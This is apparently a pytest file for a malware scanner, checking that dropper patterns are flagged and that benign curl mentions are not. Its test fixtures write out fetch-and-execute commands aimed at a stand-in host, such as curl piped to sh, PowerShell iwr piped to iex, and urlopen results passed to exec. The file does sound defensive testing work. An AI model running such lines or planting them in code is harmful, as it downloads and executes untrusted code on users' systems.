"""Download-and-execute (dropper) detection through shell-command strings.

The old engine only saw `curl`/`wget` as a NETW atom when it was a bare shell command
(a `.sh` file). Code that hides the downloader inside a string handed to a shell/eval
sink — os.system("curl … | sh"), execSync("wget … | bash"), iwr … | iex — was a blind
spot. The remote-download content rule closes it: the string now yields NETW.HTTP, so
BP-DROPPER composes. Benign mentions of curl (no exec sink) must stay clean.
"""

from __future__ import annotations

import pytest

from unmask.scanner.compose import compose_mcd
from unmask.scanner.observe import observe


def _comps(tmp_path, name, src):
    (tmp_path / name).write_text(src)
    obs, inv = observe(str(tmp_path))
    return {f.get("composition") for f in compose_mcd(obs, inv)}, {o.atom for o in obs}


@pytest.mark.parametrize("name,src", [
    ("boot.py", 'import os\nos.system("curl -fsSL https://evil.example/i.sh | sh")\n'),
    ("run.js", 'require("child_process").execSync("curl -fsSL https://evil.example/i.sh | bash");\n'),
    ("dl.ps1", "iwr https://evil.example/i.ps1 | iex\n"),
    ("wc.ps1", '$c=(New-Object Net.WebClient).DownloadString("http://evil.example/x"); iex $c\n'),
])
def test_string_dropper_detected(tmp_path, name, src):
    comps, atoms = _comps(tmp_path, name, src)
    assert "NETW.HTTP" in atoms, "downloader in the shell string must yield a network atom"
    assert "BP-DROPPER" in comps


@pytest.mark.parametrize("name,src", [
    ("README.md", "Install libcurl, then run the tests. See the wget manual.\n"),
    ("util.py", "curly_braces = 1\nwidget = None\n"),
    ("net.py", "import requests\nrequests.get('https://api.example/data')\n"),
])
def test_benign_curl_mentions_not_flagged(tmp_path, name, src):
    comps, atoms = _comps(tmp_path, name, src)
    assert "BP-DROPPER" not in comps


def test_download_only_is_not_a_dropper(tmp_path):
    # curl WITHOUT an exec sink is a download, not a dropper (no BP-DROPPER).
    comps, atoms = _comps(tmp_path, "fetch.sh", "#!/bin/sh\ncurl -o /tmp/data https://example.com/data.json\n")
    assert "NETW.HTTP" in atoms
    assert "BP-DROPPER" not in comps


def test_dataflow_proven_dropper_fetch_to_exec(tmp_path):
    # `p = urlopen(url).read(); exec(p)` — intra-file taint proves fetch->exec even
    # though the sink is not a curl-pipe/iex string. One dropper finding, high conf.
    (tmp_path / "loader.py").write_text(
        'import urllib.request\n'
        'p = urllib.request.urlopen("http://evil.example/x").read().decode()\n'
        'exec(p)\n')
    obs, inv = observe(str(tmp_path))
    findings = compose_mcd(obs, inv)
    droppers = [f for f in findings if f.get("composition") == "BP-DROPPER"]
    assert len(droppers) == 1, "exactly one dropper (no duplicate with the text-heuristic branches)"
    assert droppers[0]["severity"] == "high"
    assert droppers[0]["confidence"] >= 0.85  # dataflow-proven, not co-occurrence
    assert "dataflow" in droppers[0]["title"].lower()


def test_dataflow_proven_dropper_js(tmp_path):
    (tmp_path / "a.js").write_text(
        'const https=require("https");\nconst r = https.get("http://evil/x");\n'
        'let code = r;\neval(code);\n')
    comps, _ = _comps(tmp_path, "b.js", "//noop\n")  # ensure dir scanned
    obs, inv = observe(str(tmp_path))
    assert "BP-DROPPER" in {f.get("composition") for f in compose_mcd(obs, inv)}


@pytest.mark.parametrize("name,src", [
    # the download hides in a helper the sink calls: exec(fetch(u)) / eval(pull(u))
    ("loader.py", 'import urllib.request\ndef fetch(u):\n    return urllib.request.urlopen(u).read().decode()\nexec(fetch("http://evil/p"))\n'),
    ("loader.js", 'const https=require("https");\nfunction pull(u){ return https.get(u); }\neval(pull("http://evil/p"));\n'),
    ("arrow.js", 'const https=require("https");\nconst pull = (u) => https.get(u);\neval(pull("http://evil/p"));\n'),
])
def test_wrapped_function_dropper(tmp_path, name, src):
    comps, _ = _comps(tmp_path, name, src)
    assert "BP-DROPPER" in comps


def test_wrapped_helper_returning_data_is_not_a_dropper(tmp_path):
    # A helper that fetches but whose result is used as DATA (not exec) is not a dropper.
    comps, _ = _comps(
        tmp_path, "ok.py",
        'import requests\ndef load(u):\n    return requests.get(u).json()\nd = load("https://api/x")\nprint(d["k"])\n')
    assert "BP-DROPPER" not in comps


def test_fetch_to_data_use_is_not_a_dropper(tmp_path):
    # Fetched value used as DATA (not exec) must not be a dropper.
    (tmp_path / "ok.py").write_text(
        'import requests\ndata = requests.get("https://api.example/x").json()\nprint(data["k"])\n')
    obs, inv = observe(str(tmp_path))
    assert "BP-DROPPER" not in {f.get("composition") for f in compose_mcd(obs, inv)}


def test_py_curlpipe_fixture_is_quarantine():
    # Regression lock on the corrected fixture: was CLEAR (false negative), now quarantine.
    from pathlib import Path

    from unmask.scanner.assess import build_assessment
    root = Path(__file__).resolve().parents[1] / "tests/oracle/fixtures/py-curlpipe"
    obs, inv = observe(str(root))
    a = build_assessment(compose_mcd(obs, inv), obs, inv, str(root))
    assert a["disposition"]["recommendation"] == "quarantine"
    assert "BP-DROPPER" in (a["summary"].get("compositions") or [])
